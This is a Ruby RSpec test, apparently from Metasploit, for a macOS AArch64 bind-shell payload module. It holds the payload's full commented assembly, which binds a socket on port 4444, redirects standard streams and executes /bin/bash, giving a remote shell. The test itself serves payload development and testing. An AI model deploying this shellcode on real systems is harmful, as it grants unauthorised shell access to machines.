require 'rspec'

RSpec.describe 'singles/osx/aarch64/shell_bind_tcp' do
  include_context 'Msf::Simple::Framework#modules loading'

  let(:subject) do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'osx/aarch64/shell_bind_tcp',
      ancestor_reference_names: [
        'singles/osx/aarch64/shell_bind_tcp'
      ]
    )
  end
  let(:cmd) { nil }
  let(:lhost) { '127.0.0.1' }
  let(:lport) { '4444' }
  let(:datastore_values) { { 'CMD' => cmd, 'LHOST' => lhost, 'LPORT' => lport } }

  before(:each) do
    subject.datastore.merge!(datastore_values)
  end

  describe '#generate' do
    # Verify that the compile command is called with the expected asm string
    def expect_result_to_match(expected_asm)
      allow(subject).to receive(:compile_aarch64).and_wrap_original do |original, asm|
        compiled_asm = original.call asm
        expect(asm).to match_table(expected_asm)
        expect(compiled_asm.length).to be > 0
        'mock-aarch64-compiled'
      end
      expect(subject.generate).to eq 'mock-aarch64-compiled'
    end

    context 'when the CMD is /bin/bash' do
      let(:cmd) { '/bin/bash' }

      it 'generates the execve system call payload without arguments present' do
        expected = <<~'EOF'
        // socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
        // socket:
          mov x0, 0x2                   // x0 = AF_INET
          mov x1, 0x1                   // x1 = SOCK_STREAM
          mov x2, 0                     // x2 = IPPROTO_IP
          movz x16, #0x0200, lsl #16    // x16 = SYS_SOCKET 0x2000061
          movk x16, #0x0061
          svc 0                         // system call

          // Socket file descriptor will be in x0; Additionally the store socket file descriptor in x13
          mov x13, x0

        // int bind(int socket, const struct sockaddr *address, socklen_t address_len);
        // bind:
          // mov x0, x13                // x0 = socketfd, already set from previous socket result - additionally stored in x16
          lsl  x1, x1, #1               // x1 = struct socaddr_in; sin_family=AF_INET
          movk x1, #0x5c11, lsl #16     //    sin_port = htons(4444)
          movk x1, #0x007f, lsl #32       //    sin_addr = inet_aton(ip, &addr.sin_addr)
          movk x1, #0x0100, lsl #48
          str x1, [sp, #-8]!
          mov x1, sp                    // XXX: Should be: add x1, sp, x2, but assembler does not support it
          add x1, x1, x2                // XXX: Should be: add x1, sp, x2, but assembler does not support it
          mov x2, 16                    // x2 = sizeof(struct sockaddr) = 16
          movz x16, #0x0200, lsl #16    // x16 = SYS_BIND 0x2000068
          movk x16, #0x0068
          svc 0

        // int listen(int socket, int backlog);
        // listen:
          mov x0, x13                   // x0 = socketfd, initially stored in x13
          movz x1, #0                    // x1 = backlog = 0
          movz x16, #0x0200, lsl #16    // x16 = SYS_LISTEN 0x200006a
          movk x16, #0x006a
          svc 0

        // int accept(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len);
        // accept:
          mov x0, x13                   // x0 = socketfd, initially stored in x13
          mov x1, #0                     // x1 = restrict address = NULL
          mov x2, #0                     // x2 = address_len = 0
          movz x16, #0x0200, lsl #16    // x16 = SYS_LISTEN 0x200001e
          movk x16, #0x001e
          svc 0

          // Accepted socket file descriptor will be in x0; Additionally the store socket file descriptor in x13
          mov x13, x0

        // int dup2(int filedes=socketfd, int newfd=STDIN/STDOUT/STD)
        // dup2_calls:
          movz x16, #0x0200, lsl #16     // x16 = SYS_DUP2 0x200005a
          movk x16, #0x005a
          mov x0, x13                    // x0 = socket
          movz x1, 0                     // x1 = STDIN
          svc 0                          // system call
          mov x0, x13                    // x0 = socket
          movz x1, 1                     // x1 = STDOUT
          svc 0                          // system call
          mov x0, x13                    // x0 = socket
          movz x1, 2                     // x1 = STDERR
          svc 0                          // system call
        // int execve(const char *path, char *const argv[], char *const envp[]);
        // exec_call:
          // Set system call SYS_EXECVE 0x200003b in x16
          movz x16, #0x0200, lsl #16
          movk x16, #0x003b
          mov x9, sp // Temporarily move SP into scratch register
          // Arg 0: execve - const char *path - Pointer to the program name to run
          // Next 8 bytes of string: "/bin/bas"
        movz x0, #0x622f // "b/"
        movk x0, #0x6e69, lsl #16 // "ni"
        movk x0, #0x622f, lsl #32 // "b/"
        movk x0, #0x7361, lsl #48 // "sa"
        str x0, [x9], #8 // Store x0 on x9-stack and increment by 8
        // Next 8 bytes of string: "h\x00"
        movz x0, #0x0068 // "\x00h"
        str x0, [x9], #8 // Store x0 on x9-stack and increment by 8

        mov x0, x9 // Store the current stack location in the target register
        sub x0, x0, #16 // Update the target register to point to base of the string


          // Push execve arguments, using x1 as a temporary register
          
          // Arg 1: execve - char *const argv[] - program arguments
          // argv[0] = create pointer to base of string value "/bin/bash\x00"
        mov x1, x9
        sub x1, x1, #16 // Update the target register to point to base of the string
        str x1, [x9], #8 // Store the pointer in the stack

          // argv[1] = NULL
          str xzr, [x9], #8
          // Set execve arg1 to the base of the argv array of pointers
          mov x1, x9
          sub x1, x1, #16
          // Arg 2: execve - char *const envp[] - Environment variables, NULL for now
          mov x2, xzr
          // System call
          svc #0
        EOF

        expect_result_to_match(expected)
      end
    end
  end
end
